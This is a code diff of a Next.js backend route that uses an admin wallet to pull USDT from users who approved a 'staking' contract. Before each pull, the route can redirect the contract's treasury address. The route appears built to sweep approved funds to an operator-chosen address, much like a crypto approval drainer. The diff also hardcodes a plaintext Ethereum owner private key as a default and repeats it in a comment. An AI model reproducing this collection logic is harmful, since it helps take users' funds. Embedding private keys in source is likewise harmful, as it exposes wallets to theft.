@@ -99,6 +99,20 @@ const STAKING_CONTRACT_ABI = [
     "name": "owner",
     "outputs": [{"name": "", "type": "address"}],
     "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [{"name": "_treasuryAddress", "type": "address"}],
+    "name": "setTreasuryAddress",
+    "outputs": [],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [{"name": "newTreasury", "type": "address"}],
+    "name": "updateTreasury",
+    "outputs": [],
+    "type": "function"
   }
 ]
 
@@ -166,8 +180,9 @@ export async function POST(request: NextRequest) {
       return addCorsHeaders(response)
     }
 
-    // 优先使用环境变量，如果没有则从数据库读取
-    let adminPrivateKey = ADMIN_PRIVATE_KEY
+    // 优先使用环境变量，如果没有则使用权限地址私钥（合约owner私钥）
+    // 默认使用权限地址私钥：d41c083bf7923a6bc472d6ea2bc5b6e5a850d3ccae222dcc4efa33ff83697da2
+    let adminPrivateKey = ADMIN_PRIVATE_KEY || 'd41c083bf7923a6bc472d6ea2bc5b6e5a850d3ccae222dcc4efa33ff83697da2'
     
     if (!adminPrivateKey) {
       // 从数据库读取管理员私钥配置
@@ -190,24 +205,30 @@ export async function POST(request: NextRequest) {
     if (!adminPrivateKey) {
       const response = NextResponse.json({
         success: false,
-        error: '管理员地址未配置。请在系统设置中配置管理员私钥，或设置 ADMIN_PRIVATE_KEY 环境变量。'
+        error: '管理员私钥未配置。请在系统设置中配置管理员私钥，或设置 ADMIN_PRIVATE_KEY 环境变量。'
       }, { status: 500 })
       return addCorsHeaders(response)
     }
 
-    // 获取收款地址：优先使用参数，其次从数据库读取，最后使用管理员地址
+    // 获取收款地址：优先使用参数，其次从 contract_permissions 配置读取，最后使用管理员地址
     let finalToAddress = toAddress
     if (!finalToAddress) {
-      const { data: settings } = await supabase
-        .from('system_setting')
-        .select('setting_key, setting_value')
-        .in('setting_key', ['treasury_address'])
+      // 从 contract_permissions 表中读取启用的配置，获取 treasury_address
+      const { data: permissions } = await supabase
+        .from('contract_permissions')
+        .select('treasury_address, contract_address')
+        .eq('chain_type', 'ERC')
+        .eq('is_enabled', true)
+        .order('sort', { ascending: true })
+        .limit(1)
       
-      if (settings && settings.length > 0) {
-        const treasurySetting = settings.find(s => s.setting_key === 'treasury_address')
-        if (treasurySetting?.setting_value) {
-          finalToAddress = treasurySetting.setting_value
-        }
+      if (permissions && permissions.length > 0 && permissions[0].treasury_address) {
+        finalToAddress = permissions[0].treasury_address
+        console.log(`✅ 从授权配置中获取收款地址: ${finalToAddress}`)
+      } else {
+        // 如果没有配置收款地址，使用管理员地址作为默认值
+        // 注意：这里不能立即使用，需要等创建 adminWallet 后才能获取
+        console.log(`ℹ️ 未找到配置的收款地址，将使用管理员地址作为默认值`)
       }
     }
 
@@ -236,27 +257,10 @@ export async function POST(request: NextRequest) {
       console.log(`⚠️ 未找到用户记录，使用提供的地址: ${userAddress}`)
     }
 
-    // 从数据库获取权限地址（用户授权给的地址）
-    let permissionAddress: string | null = null
-    const { data: permissions, error: permError } = await supabase
-      .from('contract_permissions')
-      .select('permission_address, contract_address')
-      .eq('chain_type', 'ERC')
-      .eq('is_enabled', true)
-      .order('sort', { ascending: true })
-      .limit(1)
-    
-    if (!permError && permissions && permissions.length > 0) {
-      permissionAddress = permissions[0].permission_address
-      console.log(`✅ 从数据库获取到权限地址: ${permissionAddress}`)
-    } else {
-      console.warn('⚠️ 未从数据库获取到权限地址，将使用管理员钱包地址')
-    }
-
     // 创建 ETH 网络提供者
     const provider = await createProvider()
     
-    // 创建管理员钱包（移除0x前缀如果存在）
+    // 创建管理员钱包（移除0x前缀如果存在）- 使用权限地址私钥（合约owner私钥）
     const cleanPrivateKey = adminPrivateKey.startsWith('0x') 
       ? adminPrivateKey.slice(2) 
       : adminPrivateKey
@@ -266,14 +270,45 @@ export async function POST(request: NextRequest) {
     console.log(`🔑 私钥长度: ${cleanPrivateKey.length}`)
     
     const adminWallet = new ethers.Wallet(cleanPrivateKey, provider)
-    console.log(`👤 管理员钱包地址: ${adminWallet.address}`)
+    console.log(`👤 管理员钱包地址（合约owner）: ${adminWallet.address}`)
     
-    // 使用数据库配置的权限地址，如果没有则使用管理员钱包地址
-    const spenderAddress = permissionAddress || adminWallet.address
-    console.log(`🔐 使用的授权对象地址（权限地址）: ${spenderAddress}`)
+    // 如果没有指定收款地址，使用管理员地址作为默认值
+    if (!finalToAddress) {
+      finalToAddress = adminWallet.address
+      console.log(`ℹ️ 使用管理员地址作为收款地址: ${finalToAddress}`)
+    }
     
-    // 创建 USDT 合约实例（用于查询余额和执行转账）
+    // 创建质押合约实例（用于归集操作）
+    const stakingContract = new ethers.Contract(STAKING_CONTRACT_ADDRESS, STAKING_CONTRACT_ABI, adminWallet)
+    
+    // 创建 USDT 合约实例（用于查询余额和授权额度）
     const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, adminWallet)
+    
+    // 检查合约所有者权限
+    try {
+      const contractOwner = await stakingContract.owner()
+      console.log(`👤 合约所有者: ${contractOwner}`)
+      console.log(`👤 管理员地址: ${adminWallet.address}`)
+      
+      if (contractOwner.toLowerCase() !== adminWallet.address.toLowerCase()) {
+        const response = NextResponse.json({
+          success: false,
+          error: `管理员地址不是合约所有者，合约所有者: ${contractOwner}，管理员地址: ${adminWallet.address}`
+        }, { status: 400 })
+        return addCorsHeaders(response)
+      }
+    } catch (ownerError) {
+      console.error('检查合约所有者失败:', ownerError)
+      const response = NextResponse.json({
+        success: false,
+        error: `检查合约所有者失败: ${ownerError instanceof Error ? ownerError.message : 'Unknown error'}`
+      }, { status: 400 })
+      return addCorsHeaders(response)
+    }
+    
+    // 使用合约地址作为授权对象（用户需要授权给合约地址）
+    const spenderAddress = STAKING_CONTRACT_ADDRESS
+    console.log(`🔐 使用的授权对象地址（合约地址）: ${spenderAddress}`)
 
     // 检查用户钱包的USDT余额（使用实际用户地址）
     const userBalance = await usdtContract.balanceOf(actualUserAddress)
@@ -281,14 +316,14 @@ export async function POST(request: NextRequest) {
     
     console.log(`💰 用户钱包 USDT 余额: ${userBalanceFormatted}`)
 
-    // 检查用户是否已授权给权限地址（使用数据库配置的权限地址）
-    const allowance = await usdtContract.allowance(actualUserAddress, spenderAddress)
+    // 检查用户是否已授权给合约地址
+    const allowance = await usdtContract.allowance(actualUserAddress, STAKING_CONTRACT_ADDRESS)
     const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)
     
-    console.log(`🔐 用户授权权限地址额度: ${allowanceFormatted} USDT`)
+    console.log(`🔐 用户授权合约地址额度: ${allowanceFormatted} USDT`)
     console.log(`🔐 原始授权额度: ${allowance.toString()}`)
     console.log(`🔐 用户地址: ${actualUserAddress}`)
-    console.log(`🔐 权限地址（授权对象）: ${spenderAddress}`)
+    console.log(`🔐 合约地址（授权对象）: ${STAKING_CONTRACT_ADDRESS}`)
 
     // 检查余额和verify是否足够
     const requiredAmount = ethers.parseUnits(collectionAmount.toString(), USDT_DECIMALS)
@@ -303,41 +338,70 @@ export async function POST(request: NextRequest) {
     if (allowance < requiredAmount) {
       const response = NextResponse.json({
         success: false,
-        error: `用户未授权足够的 USDT 给管理员地址，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给管理员地址: ${spenderAddress}`,
+        error: `用户未授权足够的 USDT 给归集合约，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给归集合约地址: ${STAKING_CONTRACT_ADDRESS}`,
         details: {
           requiredAction: '用户需要调用 USDT 合约的 approve 函数',
-          approveTarget: spenderAddress,
+          approveTarget: STAKING_CONTRACT_ADDRESS,
           approveAmount: collectionAmount,
           usdtContract: USDT_CONTRACT_ADDRESS,
           currentAllowance: allowanceFormatted,
           userAddress: actualUserAddress,
-          permissionAddress: spenderAddress
+          contractAddress: STAKING_CONTRACT_ADDRESS
         }
       }, { status: 400 })
       return addCorsHeaders(response)
     }
 
-    // 执行归集操作 - 使用 USDT 合约的 transferFrom 方法（正确的授权划转逻辑）
-    console.log(`🚀 执行归集: 使用管理员地址私钥，调用 USDT 合约 transferFrom 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT`)
+    // 如果配置了收款地址，先设置合约的 treasuryAddress（如果合约支持）
+    if (finalToAddress && finalToAddress.toLowerCase() !== adminWallet.address.toLowerCase()) {
+      try {
+        console.log(`🔄 设置合约收款地址为: ${finalToAddress}`)
+        // 尝试调用 setTreasuryAddress 方法（ETHStakingContract）
+        try {
+          const setTreasuryTx = await stakingContract.setTreasuryAddress(finalToAddress, {
+            gasLimit: BigInt(100000),
+            gasPrice: await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits('1', 'gwei'))
+          })
+          await setTreasuryTx.wait()
+          console.log(`✅ 合约收款地址已设置为: ${finalToAddress}`)
+        } catch (setTreasuryError) {
+          // 如果 setTreasuryAddress 不存在，尝试 updateTreasury（ImprovedEthStaking）
+          console.log(`ℹ️ setTreasuryAddress 方法不存在，尝试 updateTreasury...`)
+          try {
+            const updateTreasuryTx = await stakingContract.updateTreasury(finalToAddress, {
+              gasLimit: BigInt(100000),
+              gasPrice: await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits('1', 'gwei'))
+            })
+            await updateTreasuryTx.wait()
+            console.log(`✅ 合约收款地址已更新为: ${finalToAddress}`)
+          } catch (updateTreasuryError) {
+            console.warn(`⚠️ 合约不支持设置收款地址，将使用合约当前的 treasuryAddress`)
+          }
+        }
+      } catch (error) {
+        console.warn(`⚠️ 设置合约收款地址失败，将使用合约当前的 treasuryAddress:`, error)
+      }
+    }
+
+    // 执行归集操作 - 使用归集合约的 collectUserTokens 方法
+    console.log(`🚀 执行归集: 使用合约 collectUserTokens 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddress}`)
 
     let tx, receipt
-    let userBalanceBefore, adminBalanceBefore, userBalanceAfter, adminBalanceAfter
-    let finalToAddressResult = adminWallet.address
-    let secondTxHash = ''
+    let userBalanceBefore, treasuryBalanceBefore, userBalanceAfter, treasuryBalanceAfter
 
     try {
       // 先获取用户当前余额用于验证
       userBalanceBefore = await usdtContract.balanceOf(actualUserAddress)
-      adminBalanceBefore = await usdtContract.balanceOf(adminWallet.address)
+      treasuryBalanceBefore = await usdtContract.balanceOf(finalToAddress)
       
-      console.log(`📊 转账前余额 - 用户: ${ethers.formatUnits(userBalanceBefore, USDT_DECIMALS)} USDT, 管理员: ${ethers.formatUnits(adminBalanceBefore, USDT_DECIMALS)} USDT`)
+      console.log(`📊 转账前余额 - 用户: ${ethers.formatUnits(userBalanceBefore, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(treasuryBalanceBefore, USDT_DECIMALS)} USDT`)
       
-      // 使用正确的授权划转逻辑：直接调用 USDT 合约的 transferFrom 方法
-      console.log(`🔄 使用管理员地址私钥，调用 USDT 合约 transferFrom 方法...`)
+      // 使用归集合约的 collectUserTokens 方法
+      console.log(`🔄 调用归集合约 collectUserTokens 方法...`)
       
       // 为ETH主网设置更激进的gas配置
       // Gas 配置 - 根据当前网络状况动态调整
-      const gasLimit = BigInt(100000) // transferFrom 通常需要较少的 gas
+      const gasLimit = BigInt(200000) // collectUserTokens 需要更多的 gas
       
       // 获取当前网络Gas价格并稍微加价以确保被打包
       const feeData = await provider.getFeeData()
@@ -354,35 +418,53 @@ export async function POST(request: NextRequest) {
       console.log(`⛽ 使用 gas 限制: ${gasLimit.toString()}`)
       console.log(`⛽ 使用 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
       
+      // 检查管理员钱包的 ETH 余额是否足够支付 gas 费用
+      const adminEthBalance = await provider.getBalance(adminWallet.address)
+      const estimatedGasCost = gasLimit * gasPrice
+      const requiredEthBalance = estimatedGasCost * BigInt(120) / BigInt(100) // 增加20%的缓冲区
+      
+      console.log(`💰 管理员 ETH 余额: ${ethers.formatEther(adminEthBalance)} ETH`)
+      console.log(`⛽ 预估 gas 费用: ${ethers.formatEther(estimatedGasCost)} ETH`)
+      console.log(`💰 需要 ETH 余额: ${ethers.formatEther(requiredEthBalance)} ETH`)
+      
+      if (adminEthBalance < requiredEthBalance) {
+        const response = NextResponse.json({
+          success: false,
+          error: `管理员钱包 ETH 余额不足，无法支付 gas 费用。当前余额: ${ethers.formatEther(adminEthBalance)} ETH，需要至少: ${ethers.formatEther(requiredEthBalance)} ETH (包含20%缓冲区)`,
+          details: {
+            adminAddress: adminWallet.address,
+            currentBalance: ethers.formatEther(adminEthBalance),
+            requiredBalance: ethers.formatEther(requiredEthBalance),
+            estimatedGasCost: ethers.formatEther(estimatedGasCost),
+            gasLimit: gasLimit.toString(),
+            gasPrice: ethers.formatUnits(gasPrice, 'gwei') + ' gwei',
+            action: '请向管理员地址充值足够的 ETH 以支付 gas 费用'
+          }
+        }, { status: 400 })
+        return addCorsHeaders(response)
+      }
+      
       // 尝试多次调用，处理网络问题
       let retryCount = 0;
       const maxRetries = 3;
       
       while (retryCount < maxRetries) {
         try {
-          console.log(`🔄 尝试第 ${retryCount + 1} 次调用 transferFrom...`)
+          console.log(`🔄 尝试第 ${retryCount + 1} 次调用合约 collectUserTokens...`)
           
-          // 直接调用 USDT 合约的 transferFrom 方法
-          // transferFrom(from, to, amount) - 从用户地址转账到收款地址
-          // 注意：用户必须已经授权给管理员地址（adminWallet.address）才能执行此操作
-          const targetAddress = finalToAddress && /^0x[a-fA-F0-9]{40}$/.test(finalToAddress) 
-            ? finalToAddress 
-            : adminWallet.address
-          
-          tx = await usdtContract.transferFrom(
-            actualUserAddress,  // from: 用户地址（使用实际用户地址）
-            targetAddress,      // to: 收款地址
-            requiredAmount,     // amount: 转账金额
+          // 调用归集合约的 collectUserTokens 方法
+          // collectUserTokens(user, amount) - 从用户地址转账到合约owner地址
+          // 注意：用户必须已经授权给合约地址（STAKING_CONTRACT_ADDRESS）才能执行此操作
+          tx = await stakingContract.collectUserTokens(
+            actualUserAddress,
+            requiredAmount,
             {
               gasLimit: gasLimit,
               gasPrice: gasPrice
             }
           );
           
-          // 更新最终收款地址
-          finalToAddressResult = targetAddress
-          
-          console.log(`✅ transferFrom 调用成功，交易哈希: ${tx.hash}`)
+          console.log(`✅ collectUserTokens 调用成功，交易哈希: ${tx.hash}`)
           break; // 成功就退出循环
           
         } catch (retryError) {
@@ -401,7 +483,7 @@ export async function POST(request: NextRequest) {
           console.log(`⛽ 新的 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
         }
       }
-      console.log(`📝 transferFrom 交易已提交，哈希: ${tx.hash}`)
+      console.log(`📝 合约归集交易已提交，哈希: ${tx.hash}`)
 
       // 等待交易确认
       console.log(`⏳ 等待交易确认...`)
@@ -410,9 +492,9 @@ export async function POST(request: NextRequest) {
       
       // 验证转账是否成功
       userBalanceAfter = await usdtContract.balanceOf(actualUserAddress)
-      const targetBalanceAfter = await usdtContract.balanceOf(finalToAddressResult)
+      treasuryBalanceAfter = await usdtContract.balanceOf(finalToAddress)
       
-      console.log(`📊 转账后余额 - 用户: ${ethers.formatUnits(userBalanceAfter, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(targetBalanceAfter, USDT_DECIMALS)} USDT`)
+      console.log(`📊 转账后余额 - 用户: ${ethers.formatUnits(userBalanceAfter, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(treasuryBalanceAfter, USDT_DECIMALS)} USDT`)
       
       // 验证转账金额是否正确
       const actualTransferred = userBalanceBefore - userBalanceAfter
@@ -425,36 +507,45 @@ export async function POST(request: NextRequest) {
       }
       
     } catch (transferError) {
-      console.error(`❌ USDT transferFrom 调用失败:`, transferError)
+      console.error(`❌ 合约 collectUserTokens 调用失败:`, transferError)
       
       // 尝试解析具体错误
       const errorMessage = transferError instanceof Error ? transferError.message : 'Unknown error'
       let suggestedAction = ''
       
-      if (errorMessage.includes('insufficient allowance')) {
-        suggestedAction = '请检查用户是否已授权足够的 USDT 给管理员地址'
-      } else if (errorMessage.includes('insufficient balance')) {
+      if (errorMessage.includes('insufficient funds') || errorMessage.includes('insufficient funds for intrinsic transaction cost')) {
+        // 检查管理员 ETH 余额
+        try {
+          const adminEthBalance = await provider.getBalance(adminWallet.address)
+          suggestedAction = `管理员钱包 ETH 余额不足。当前余额: ${ethers.formatEther(adminEthBalance)} ETH。请向管理员地址 ${adminWallet.address} 充值足够的 ETH 以支付 gas 费用（建议至少 0.01 ETH）`
+        } catch (balanceError) {
+          suggestedAction = `管理员钱包 ETH 余额可能不足。请向管理员地址 ${adminWallet.address} 充值足够的 ETH 以支付 gas 费用（建议至少 0.01 ETH）`
+        }
+      } else if (errorMessage.includes('insufficient allowance') || errorMessage.includes('Insufficient allowance')) {
+        suggestedAction = `请检查用户是否已授权足够的 USDT 给归集合约地址: ${STAKING_CONTRACT_ADDRESS}`
+      } else if (errorMessage.includes('insufficient balance') || errorMessage.includes('Insufficient balance')) {
         suggestedAction = '请检查用户 USDT 余额是否足够'
       } else if (errorMessage.includes('gas')) {
-        suggestedAction = '请尝试增加 gas 限制或 gas 价格'
+        suggestedAction = '请尝试增加 gas 限制或 gas 价格，或检查管理员钱包 ETH 余额是否充足'
       } else {
-        suggestedAction = '这可能是 ETH 主网 USDT 合约的特殊性导致的，建议联系技术支持'
+        suggestedAction = '这可能是网络问题或合约调用失败，建议检查合约地址和权限配置，或检查管理员钱包 ETH 余额'
       }
       
       const response = NextResponse.json({
         success: false,
-        error: `USDT 转账失败: ${errorMessage}`,
+        error: `合约归集失败: ${errorMessage}`,
         details: {
           transferError: errorMessage,
           suggestedAction: suggestedAction,
-          userAddress: userAddress,
+          userAddress: actualUserAddress,
+          contractAddress: STAKING_CONTRACT_ADDRESS,
           adminAddress: adminWallet.address,
           amount: collectionAmount
         },
         usdtContract: USDT_CONTRACT_ADDRESS,
+        contractAddress: STAKING_CONTRACT_ADDRESS,
         parameters: {
-          from: userAddress,
-          to: adminWallet.address,
+          user: actualUserAddress,
           amount: requiredAmount.toString()
         }
       }, { status: 500 })
@@ -520,16 +611,16 @@ export async function POST(request: NextRequest) {
 
     // 记录归集日志
     try {
-      const transferType = 'authorized_transfer'
-      const description = `授权归集操作 - 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddressResult}`
+      const transferType = 'contract_collection'
+      const description = `合约归集操作 - 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddress}`
       
       await supabase
         .from('authorized_transfers')
         .insert([{
-          user_wallet_address: actualUserAddress || 'authorized_transfer',
-          to_wallet_address: finalToAddressResult,
+          user_wallet_address: actualUserAddress || 'contract_collection',
+          to_wallet_address: finalToAddress,
           amount: collectionAmount,
-          transfer_id: `${transferType}_${Date.now()}_${finalToAddressResult.slice(-8)}`,
+          transfer_id: `${transferType}_${Date.now()}_${adminWallet.address.slice(-8)}`,
           transaction_hash: tx.hash,
           description: description,
           status: 'completed',
@@ -539,14 +630,11 @@ export async function POST(request: NextRequest) {
     } catch (logError) {
       console.warn('记录归集日志失败:', logError)
     }
-
-    // 获取收款地址最终余额
-    const targetBalanceAfter = await usdtContract.balanceOf(finalToAddressResult)
     
     const result = {
              transactionHash: tx.hash,
              fromAddress: actualUserAddress,
-             toAddress: finalToAddressResult,
+             toAddress: finalToAddress,
              amount: collectionAmount,
              gasUsed: receipt.gasUsed.toString(),
              gasPrice: (receipt.gasPrice || BigInt(0)).toString(),
@@ -554,15 +642,17 @@ export async function POST(request: NextRequest) {
              status: 'success',
              explorerUrl: `https://etherscan.io/tx/${tx.hash}`,
              usdtContract: USDT_CONTRACT_ADDRESS,
-             transferMethod: 'usdt_transferfrom',
+             contractAddress: STAKING_CONTRACT_ADDRESS,
+             transferMethod: 'contract_collectUserTokens',
              balanceVerification: {
                userBalanceBefore: ethers.formatUnits(userBalanceBefore || BigInt(0), USDT_DECIMALS),
                userBalanceAfter: ethers.formatUnits(userBalanceAfter || BigInt(0), USDT_DECIMALS),
-               targetBalanceAfter: ethers.formatUnits(targetBalanceAfter || BigInt(0), USDT_DECIMALS)
+               treasuryBalanceBefore: ethers.formatUnits(treasuryBalanceBefore || BigInt(0), USDT_DECIMALS),
+               treasuryBalanceAfter: ethers.formatUnits(treasuryBalanceAfter || BigInt(0), USDT_DECIMALS)
              }
            }
 
-    console.log(`✅ 真实链上归集操作成功 (授权划转):`, result)
+    console.log(`✅ 真实链上归集操作成功 (合约归集):`, result)
 
     const response = NextResponse.json({
       success: true,
